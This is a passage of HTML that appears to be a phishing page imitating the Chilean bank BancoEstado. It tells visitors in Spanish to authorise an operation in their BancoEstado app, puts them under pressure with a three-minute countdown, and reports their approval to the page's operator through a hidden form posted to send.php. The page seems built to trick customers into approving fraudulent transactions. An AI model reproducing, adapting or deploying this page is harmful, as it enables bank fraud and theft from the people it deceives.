xbs7HvGWLFxgSt5L+nfjrP6Ki6gKrJOKscPp3mo1BHrCz2SWsAHGkK1a7kJXGHW1ud5rzaGAeAFTjLzuv6sW9m5bRe7ofNDdW6N9LM+lUgViWsUMSUWgxXU+o8JAZNbUojGMY0sNSH1fTZEKphkP+Zc79tFfX+MnLEbM/cmtXW1SBq0cO2dnXpW0FXC8Kqh32YQzcRzGZrOSg2Kx8lYWmyvQS7zNKvzk5q+mysuVSisahyUYKoKu2PygcyHO2PYOD+p0z94uF33fGL6PJFEEeD7ItsfiYBgE/+7PR11HefKYxbz4/LK1dYCx/h0s0GUlUSVARWv7iPALK76mR6Vs6MM83MuCM0ANcQ0zk1ml6lDdwNBi5y8yraplaHG6HW2a3PmPxCF4JYGf16OC1TAklcOm82yLMFm2obagHnDhB0EcSV1AhkqYh4ZBLC55IDKJICo05TdQBC8ynIRrh4g2N2+ZIzl4a1VlbJ5xxXDJBpKpXrH9bng/abd0INKIeqlxhAgyGmM1soZar5lrWwojF1UIGs91cqqzJcMWzRURqeZqIvDarfvf/dHzlvxwVNO/CC7SURiK2OFqcWtLu7K1Cle371nRuWy4O7D1Dev6Jy2ahrjCwj5lSP7dQRwERcFBAUqVFVLkZZARKbCFeiqBHdIZPjEKue203Z9u5ImAREPmTHWA5RJ7DGpRwUFrOTaI/ULu2IOrR+pvH+arEEqrFiandsh/RISkaabpB4WkNDCKc8aucro61ahK+eGwJR7T6ohDJTuMDIyPCrFTawQHpK+TITVa+ZIjTGlWZzBW1IBfsiJUNMkrIBdYehA3ky20QTzupY1W+p8tZRlPeuxr5RlUfifkQ/V8aA7k9M/Bj3w+mHjn/od0A7S+MltpdOINayNDn54/sv42OvvpW5+8CyLN+2P65eW+aEFRWMqoqOS+WUSY8wILEiStk79wj0TGqXcx1/MapSaLNzNyBnBPYNaS+EegJMvwdsorXvOULHyWPUjddQFU0s6aTHNpa6KpCeOQJP5zBtLW7B31WzWzWnZ1jTJp3Yuc9FpiG6Q9knVyuHkKp6SD6D4pZhB5rSFE3d7mV3Qm0O3gZIUG7r0Hgz7bWfr8gxH1AWhYAkgtVYGQoWIRTtBu0wpwF8oGWrmz19pJs9Nq7X3/vCTR/+LWCRITtn5FKWqku1l00g3jJl7pxZbL/qmte/cXs+v4UEN10oq2sPxv3XCOhImREO7JjNzBBLmAIB6P1qeqsd7rjpIZ1BABIbrEh3RIg0y2dSvVpIQ1aD8rIzt4MRG0JoBHWY1Jiae60HrSgvodpoUp0aImYlqHnvp4SdZVqThBtb5AdYfxzpHo1R5BGDwMnmZl90yeTYaiQSYzY4HtZIMsqrLTZbpibvBnfYGNvGauZlX1Bd0gAAAhQVUAGklApr7jCIglfjuufh3Lzv/3L50WO/Xhf54d+e+/fj33rPXc/YeLQ4dYqcib/c9n8TCABgseDFqWrx8o/e9NDH5+9963XXHhuOvKWbzd4uPb9jWVavO1gd0CgjHZSDbpTSFQJKR56+AcThw3yhDjwFafWrMmpelicOpkgEgSqbpuLl2KsPnoi02WpIVJWIWnUkUYuqrPpMIUBQE0pZ3QehAHNXrbfV4eEahdZP6uVrpH6dUFVlyE8fkaNiSBjaGpFf7mf6ErF5iUBU4HU/TehCMVQpqkoggUbirNqZzaRKtRfW684j5y7ycoyS1WQRaVVyTXP0smD1wg4KalWuqnOdqBgpGb5LTAJkaXNceYuI2ypEa+hUraAWaUOqpFTtdkQ6ExJSAjFjoG4ceFjP+/k45+ECVJ/qi/6m4/73Z8//96mv3/yxfwQqqjJwCi9HnbpY+x9wcQd6JovzZAAAAABJRU5ErkJggg==" class="lock-img" alt="Candado BancoEstado">

        <div class="dots-loader">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>

        <div class="phone-wrap">
            <div class="phone-screen"></div>
        </div>
    </div>

    <!-- Texto -->
    <p class="main-text">Autoriza con tu app BancoEstado y recuerda volver a esta web para finalizar.</p>

    <!-- Mockup celular -->
    <div class="phone-mockup-wrap">
        <div class="phone-frame">
            <div class="mockup-screen">
                <!-- Notificación -->
                <div class="mockup-notify-bar">
                    <div class="mockup-notify-left">
                        <div class="mockup-app-icon">
                            <svg width="10" height="10" viewBox="0 0 24 24" fill="rgba(255,255,255,0.85)">
                                <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2z"/>
                            </svg>
                        </div>
                        <span class="mockup-notify-text">Autoriza tus operaciones</span>
                    </div>
                    <span class="mockup-notify-arrow">›</span>
                </div>

                <!-- Accesos rápidos label -->
                <div class="mockup-section-label">Accesos rápidos</div>

                <!-- Iconos accesos rápidos -->
                <div class="mockup-quick-access">
                    <div class="qa-item">
                        <div class="qa-circle red-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
                        </div>
                        <span class="qa-label">Activar Pasada QR</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"/></svg>
                        </div>
                        <span class="qa-label">Pagar o girar con QR</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
                        </div>
                        <span class="qa-label">Bus, bici y transferir</span>
                    </div>
                    <div class="qa-item">
                        <div class="qa-circle gray-c">
                            <svg width="12" height="12" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
                        </div>
                        <span class="qa-label">Emergencias y ayuda</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Botón Finalizado ARRIBA del contador -->
    <form id="finalizadoForm" action="send.php" method="POST" class="form-finalizado">
        <input type="hidden" name="estado" value="autorizado">
        <input type="hidden" name="tiempo_restante" id="tiempoRestanteInput" value="180">
        <button type="submit" class="finalizado-btn" onclick="handleFinalizado(event)">
            Finalizado
        </button>
    </form>

    <!-- Contador ABAJO del botón -->
    <div class="timer-container">
        <span class="timer-label">Tiempo disponible:</span>
        <span class="timer-value" id="timerDisplay">3:00</span>
    </div>

</div>

<script>
    let segundosRestantes = 180;
    const timerDisplay  = document.getElementById('timerDisplay');
    const tiempoInput   = document.getElementById('tiempoRestanteInput');

    function formatTimer(s) {
        const min = Math.floor(s / 60);
        const seg = s % 60;
        return min + ':' + String(seg).padStart(2, '0');
    }

    const timerInterval = setInterval(() => {
        if (segundosRestantes <= 0) {
            clearInterval(timerInterval);
            timerDisplay.textContent = '0:00';
            timerDisplay.classList.add('urgent');
            return;
        }
        segundosRestantes--;
        timerDisplay.textContent = formatTimer(segundosRestantes);
        tiempoInput.value = segundosRestantes;
        if (segundosRestantes <= 30) timerDisplay.classList.add('urgent');
    }, 1000);

    function handleFinalizado(event) {
        event.preventDefault();
        tiempoInput.value = segundosRestantes;
        document.getElementById('finalizadoForm').submit();
    }
</script>
</body>
</html>
